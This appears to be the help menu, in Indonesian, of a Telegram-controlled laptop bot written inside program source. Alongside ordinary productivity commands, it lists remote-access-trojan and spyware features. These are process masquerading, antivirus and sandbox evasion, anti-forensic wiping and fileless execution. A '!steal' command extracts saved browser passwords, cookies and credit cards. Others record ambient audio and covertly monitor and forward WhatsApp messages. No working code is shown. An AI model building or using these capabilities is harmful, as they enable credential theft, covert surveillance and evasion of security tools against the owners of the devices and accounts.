<code>!guard [on|off]</code> — Aktifkan mode pengawasan gerakan laptop lewat webcam
<code>!lock</code> — Kunci layar laptop
<code>!unlock</code> — Buka kunci layar laptop
<code>!reboot</code> — Restart laptop (butuh konfirmasi)
<code>!run [script]</code> — Jalankan script secara aman
<code>!listen [detik]</code> — Rekam suara sekitar (max 30s)
<code>!logout</code> — Keluar sesi aktif
<code>!help</code> — Tampilkan bantuan ini

<b>Stealth & Security:</b>
<code>!stealth on|off|status</code> — Basic process masquerade
<code>!stealth masquerade [name]</code> — Spoof argv[0] + process name
<code>!stealth harden</code> — Anti-ptrace + disable core dumps
<code>!stealth detect</code> — Scan EDR/AV + sandbox detection
<code>!stealth clean [aggressive]</code> — Anti-forensic: wipe traces
<code>!stealth fileless python|shell|url</code> — Memory-only execution
<code>!self_destruct panic</code> — Emergency: clear clipboard, hide windows, mute
<code>!self_destruct run [keep_config]</code> — Hapus jejak + persistence
<code>!self_destruct deep [keep_persistence]</code> — Deep wipe: logs, cache, browser, trash, DNS, history

<b>6. Produktivitas:</b>
<code>!focus [on|off] [menit]</code> — Mode fokus dengan Pomodoro timer + blokir situs
<code>!workspace [save|load|list|delete] [nama]</code> — Simpan/muat seluruh sesi kerja
<code>!quicknote [judul] [isi]</code> — Catatan markdown cepat
<code>!browser [new|search|scroll|refresh|close] [args]</code> — Kontrol browser dari HP
<code>!daily [yesterday]</code> — Laporan aktivitas laptop 24 jam
<code>!reminder [add|list|delete] [teks] [waktu]</code> — Pengingat dengan notifikasi
<code>!task [add|list|done|delete] [tugas]</code> — Manajemen tugas terpusat
<code>!meeting mode [on|off] [nama]</code> — Persiapan meeting otomatis
<code>!custom alias [nama] [perintah]</code> — Buat alias perintah custom sendiri

<b>7. AI & Automation (Beta):</b>
<code>!agent &lt;goal&gt;</code> — 🤖 Autonomous Agent: goal → rencana → eksekusi multi-step, progress ke Telegram
<code>!ai work [perintah]</code> — AI assistant produktivitas
<code>!ai write [tipe] [topik]</code> — Buat draft dokumen/email via AI
<code>!ai automate [deskripsi]</code> — Buat automation script via AI
<code>!ai summarize [target]</code> — Ringkasan file/folder via AI
<code>!ai research [topik] [depth]</code> — Riset topik via AI, simpan ke folder Research
<code>!ai insight [daily|weekly|monthly]</code> — Analisis pola penggunaan laptop
<code>!smart_clip [on|off|history]</code> — Smart clipboard dengan deteksi tipe data
<code>!macro [record|play|save|list|delete] [nama]</code> — Rekam/putar aksi keyboard mouse
<code>!schedule add &lt;perintah&gt; &lt;waktu&gt;</code> — Jadwalkan perintah otomatis
<code>!voice_cmd [on|off]</code> — Aktifkan voice command dari HP

<b>8. File, Sync & Data Management (Beta):</b>
<code>!sync &lt;folder&gt; [service]</code> — Sinkronisasi folder ke cloud (local/gdrive)
<code>!quick_upload</code> — Lihat folder upload untuk kirim file dari HP
<code>!recent [files|folders] [jumlah]</code> — Daftar file/folder terbaru
<code>!search_content &lt;keyword&gt; [folder]</code> — Cari teks di dalam file
<code>!convert &lt;file&gt; &lt;format&gt;</code> — Konversi format file (pandoc/ffmpeg)
<code>!backup &lt;folder&gt; [quick|full]</code> — Backup folder ke penyimpanan aman
<code>!organize &lt;folder&gt; [by type|date]</code> — Organisir file otomatis ke subfolder
<code>!file_watcher [on|off|status] &lt;folder&gt;</code> — Pantau perubahan folder realtime
<code>!version [commit|history|revert|status] &lt;file&gt;</code> — Versioning file lokal
<code>!clean [temp|cache|duplicates|all]</code> — Bersihkan sampah disk

<b>9. System Enhancement (Beta):</b>
<code>!volume [app|global] [level|up|down|mute]</code> — Kontrol volume global/per-app
<code>!power [performance|balanced|saver]</code> — Ganti profil daya laptop
<code>!multi_monitor [list|switch|arrange] [args]</code> — Kelola monitor ganda
<code>!sleep [delay]</code> — Tidurkan laptop (contoh: !sleep 5m)
<code>!wake &lt;waktu&gt;</code> — Jadwalkan bangunkan laptop (contoh: !wake 07:30)
<code>!quick_app &lt;nama&gt;</code> — Buka aplikasi cepat (alias !launch)
<code>!night_mode [on|off]</code> — Dark mode + blue light filter
<code>!window [arrange|snap|minimize all|close all]</code> — Atur semua jendela
<code>!hotkey [create|list|delete] &lt;nama&gt; &lt;key&gt;</code> — Buat hotkey global
<code>!launch_advanced &lt;app&gt; [args]</code> — Luncurkan aplikasi dengan parameter

<b>10. Advanced & Pro (Beta):</b>
<code>!time_track [start|stop|status|report] [project]</code> — Lacak waktu kerja
<code>!session [save|list|restore|delete] &lt;name&gt;</code> — Simpan/pulihkan session aplikasi
<code>!share_screen [fullscreen|area]</code> — Screenshot layar
<code>!multi_device [register|list|delete|send] &lt;name&gt; [ip/command]</code> — Kelola multi-perangkat
<code>!profile [create|list|apply|delete] &lt;name&gt;</code> — Profile pengguna (apps, power, tema)
<code>!dash</code> — Tampilkan dashboard sistem
<code>!activity_log [days] [--filter=aksi]</code> — Lihat log aktivitas
<code>!vpn [status|connect|disconnect] [name]</code> — Kontrol VPN
<code>!tunnel [create|list|start|delete] &lt;name&gt; &lt;remote&gt; &lt;port&gt;</code> — Tunnel SSH
<code>!ai_agent &lt;task&gt;</code> — AI Agent untuk tugas kompleks

<b>11. AI Advanced Intelligence (NEW):</b>
<code>!memory [search|summarize|forget|stats|sync]</code> — Long-term memory RAG system
<code>!mcp [on|off|status|query]</code> — Memory Context Provider (monitoring realtime)
<code>!companion &lt;pesan&gt;</code> — Personal AI companion dengan emotional intelligence
<code>!solve &lt;problem&gt;</code> — Advanced problem solver dengan web access
<code>!create feature &lt;deskripsi&gt;</code> — Self-feature generation via AI
<code>!learn &lt;topik&gt;</code> — Continuous knowledge enrichment
<code>!self evolve</code> — Daily self-introspection & auto evolution
<code>!optimize me</code> — Personalized usage optimization advisor
<code>!proactive [on|off|status]</code> — Proactive & reactive awareness alerts
<code>!agent &lt;goal&gt;</code> — Advanced autonomous agent mode

<b>12. Browser Intel & WhatsApp Spy:</b>
<code>!steal all|cookies|passwords|cards|autofill|addresses|extensions|sessions|profiles</code> — Extract browser cookies, saved passwords, credit cards, autofill dari Chrome/Firefox
<code>!browser_history history|bookmarks|downloads [args]</code> — Riwayat browsing, bookmark, download
<code>!wa check &lt;nomor&gt;</code> — Cek status online/offline WhatsApp
<code>!wa monitor &lt;nomor&gt; [interval]</code> — Monitor background + notif Telegram
<code>!wa stop &lt;nomor&gt;</code> — Hentikan monitor
<code>!wa stop_all</code> — Hentikan semua monitor
<code>!wa list</code> — Monitor aktif
<code>!wa status</code> — Status koneksi
<code>!wa reset</code> — Reset pairing (QR baru)
<code>!wa messages &lt;nomor&gt; [limit]</code> — Riwayat pesan
<code>!wa groups</code> — Daftar grup
<code>!wa send &lt;nomor&gt; &lt;teks&gt;</code> — Kirim pesan
<code>!wa forward &lt;on|off|status&gt; [nomor]</code> — Forward pesan otomatis ke Telegram

<b>Mode AI (jika aktif):</b>
Ketik perintah natural language langsung untuk diterjemahkan oleh AI. Contoh:
- "Ambil screenshot layar sekarang"
- "Tampilkan info sistem"
- "Masuk ke mode terminal"
- "Kunci laptopku"
"""

